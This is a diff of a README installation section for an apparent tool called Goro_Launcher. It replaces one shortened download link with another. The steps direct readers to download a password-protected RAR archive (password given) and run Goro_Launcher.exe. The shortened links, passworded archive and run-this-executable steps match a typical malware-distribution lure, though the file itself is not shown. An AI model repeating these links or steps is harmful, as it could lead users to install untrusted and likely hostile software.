@@ -30,7 +30,7 @@ The best free software distributors:3 <br>
 
 <a name="installation"><h2>🛠 Installation</h2></a>
 
-1. Download last release from the  # [Download](https://u.to/fwnUIA )
+1. Download last release from the  # [Download](https://u.to/sCDUIA)
           Password : gorov2
 2. Open Goro_Launcher.rar and double-click the folder inside
 3. Run Goro_Launcher.exe and wait for the macro to load
